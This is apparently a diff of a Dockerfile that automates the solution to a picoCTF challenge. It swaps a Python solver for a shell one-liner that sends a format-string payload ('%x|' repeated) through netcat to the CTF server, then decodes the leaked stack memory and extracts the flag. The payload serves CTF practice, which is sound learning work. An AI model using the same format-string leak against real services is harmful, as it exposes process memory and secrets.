@@ -1,28 +1,11 @@
-# # Base image
-# FROM alpine AS build
+# 105
 
-# # Get files
-# WORKDIR /
-# RUN wget https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c
+FROM ubuntu
 
+RUN apt-get update && apt-get install -y wget netcat xxd
 
-# Base image
-FROM python:alpine
-
-# Working Directory
 WORKDIR /picoctf
 
-# # Copy files
-# COPY --from=build vuln.c .
+RUN wget https://mercury.picoctf.net/static/77a2b202236aa741e988581e78d277a6/enc
 
-# Install dependencies
-RUN apk add --no-cache netcat-openbsd
-RUN pip install --no-cache-dir termcolor
-
-# Flag style
-ARG FLAG_STYLE="%s\n"
-ENV FLAG_STYLE=$FLAG_STYLE
-
-# Run solution
-COPY solution.py .
-CMD [ "/picoctf/solution.py" ]
+CMD set -x; printf "1\n%100s\n" | sed 's/ /%x|/g' | nc mercury.picoctf.net 27912 | sed -E "s/(\w{2})(\w{2})(\w{2})(\w+)\|/\4\3\2\1/gi" | xxd -r -p | grep -aoP 'picoCTF{.+}'
